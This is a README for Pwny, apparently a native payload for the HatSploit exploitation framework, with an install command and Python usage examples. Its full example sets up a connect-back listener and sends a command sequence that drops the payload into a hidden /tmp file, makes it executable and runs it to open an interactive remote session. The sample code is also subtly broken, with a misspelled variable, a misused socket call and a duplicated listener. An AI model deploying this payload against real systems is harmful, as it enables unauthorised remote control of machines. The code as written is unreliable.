# Pwny

<p>
    <a href="https://entysec.netlify.app">
        <img src="https://img.shields.io/badge/developer-EntySec-3572a5.svg">
    </a>
    <a href="https://github.com/EntySec/Pwny">
        <img src="https://img.shields.io/badge/language-C-grey.svg">
    </a>
    <a href="https://github.com/EntySec/Pwny/stargazers">
        <img src="https://img.shields.io/github/stars/EntySec/Pwny?color=yellow">
    </a>
</p>

Pwny is an implementation of an advanced native-code HatSploit payload, designed for portability, embeddability, and low resource utilization.

## Installing

You should install HatSploit to get Pwny, because Pwny depends on HatSploit Framework.

```
pip3 install git+https://github.com/EntySec/HatSploit
```

**NOTE:** Do not install Pwny directly from this repository, because it should be installed by HatSploit.

## Basic usage

To use Pwny and build payloads you should import it to your source.

```python3
from pwny import Pwny
from pwny import PwnySession
```

To build payload, you should call `pwny.get_payload()`.

```python3
from pwny import Pwny

pwny = Pwny()
payload = pwny.get_payload('linux', 'x64')
```

Full example of how Pwny can be used out of HatSploit.

```python3
import socket

from pwny import Pwny
from pwny.session import PwnySession

CONNBACK_HOST = '192.168.1.95'
CONNBACK_PORT = '8888'

pwny = Pwny()

session = PwnySession()
session.details['Platform'] = 'linux'

payload = pwny.get_payload('linux', 'x64')
args = pwny.encode_args(CONNBACK_HOST, CONNBACK_PORT)

instructions = (
    "cat >/tmp/.pwny;"
    "chmod 777 /tmp/.pwny;"
    f"sh -c '/tmp/.pwny {args} &'"
)

socket = socket()
socket.bind(('0.0.0.0', 8888))
socket.listen(1)

client, address = socket.accept()

client.send(instructions.encode())
cleint.send(payload)

socket = socket()
socket.bind(('0.0.0.0', 8888))
socket.listen(1)

session.open(client)
session.interact()
```
